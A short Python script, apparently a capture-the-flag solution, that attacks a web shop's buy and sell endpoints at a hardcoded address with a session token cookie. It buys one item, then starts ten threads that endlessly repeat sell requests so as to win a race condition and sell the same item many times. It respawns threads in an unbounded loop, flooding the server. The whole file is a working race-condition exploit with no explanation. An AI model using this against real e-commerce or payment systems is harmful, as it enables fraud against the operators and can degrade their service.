import requests as req
import threading as thd

while True:
	url1 = 'http://128.199.210.141:10020/buy/1'
	url2 = 'http://128.199.210.141:10020/sell/96'
	kuki = {'token':'fde63eb8-c17c-4873-a6ec-2b684e6e89c1'}

	resp = req.post(url1, cookies=kuki)
	print("======== buy again ========")

	def lari(x):
		while x:
			resp = req.post(url2, cookies=kuki)
			if 'Thank you!' in resp.text:
				print('Success!!')

	t1 = thd.Thread(target=lari, args=(1, ))
	t2 = thd.Thread(target=lari, args=(1, ))
	t3 = thd.Thread(target=lari, args=(1, ))
	t4 = thd.Thread(target=lari, args=(1, ))
	t5 = thd.Thread(target=lari, args=(1, ))
	t6 = thd.Thread(target=lari, args=(1, ))
	t7 = thd.Thread(target=lari, args=(1, ))
	t8 = thd.Thread(target=lari, args=(1, ))
	t9 = thd.Thread(target=lari, args=(1, ))
	t10 = thd.Thread(target=lari, args=(1, ))
	t1.start()
	t2.start()
	t3.start()
	t4.start()
	t5.start()
	t6.start()
	t7.start()
	t8.start()
	t9.start()
	t10.start()